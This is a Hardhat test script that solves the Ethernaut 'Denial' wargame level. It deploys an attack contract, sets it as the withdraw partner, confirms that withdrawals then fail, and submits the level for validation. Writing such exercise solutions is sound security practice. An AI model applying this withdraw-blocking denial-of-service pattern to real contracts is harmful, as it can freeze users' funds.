import {ethers} from 'hardhat'
import {BigNumber, Contract, providers, Signer} from 'ethers'

import {ETHERNAUT_ADDRESS, expect, expectStatusFail, expectStatusOK} from './testUtil'

const LEVEL_ADDRESS = '0xcE1BB92eeb71AF5Fec09D38B0c854d55285f6e04'
const INSTANCE_ADDRESS = '0x6118EFF4b502DAcf0CCc0e98644831de0f339066'

describe('20 Denial', () => {
  let ethernaut: Contract
  let instance: Contract
  let attack: Contract
  let signer: Signer
  let signerAddress: string
  let provider: providers.Provider

  let instanceBalance: BigNumber

  before(async () => {
    ethernaut = await ethers.getContractAt('Ethernaut', ETHERNAUT_ADDRESS)
    instance = await ethers.getContractAt('Denial', INSTANCE_ADDRESS)

    const factory = await ethers.getContractFactory('DenialAttack')
    attack = await factory.deploy()
    await attack.deployTransaction.wait()

    const signers = await ethers.getSigners()
    signer = signers[0]
    signerAddress = await signer.getAddress()
    provider = signer.provider!
  })

  it('sets attack contract as withdraw partner', async () => {
      const tx = await instance.setWithdrawPartner(attack.address)
      await tx.wait()
      expect(await instance.partner()).to.eq(attack.address)
  })

  it('verifies withdraw fails', async () => {
      instanceBalance = await provider.getBalance(instance.address)
      const tx = await instance.withdraw({ gasLimit: 500000 })
      return expectStatusFail(tx)
  })

  it('verifies instance balance has not decreased', async () => {
      const newInstanceBalance = await provider.getBalance(instance.address)
      expect(newInstanceBalance).to.eq(instanceBalance)
  })

  it('is validated', async () => {
    return expect(ethernaut.submitLevelInstance(instance.address, {gasLimit:100000}))
      .to.emit(ethernaut, 'LevelCompletedLog')
      .withArgs(signerAddress, LEVEL_ADDRESS).eventually
  })
})
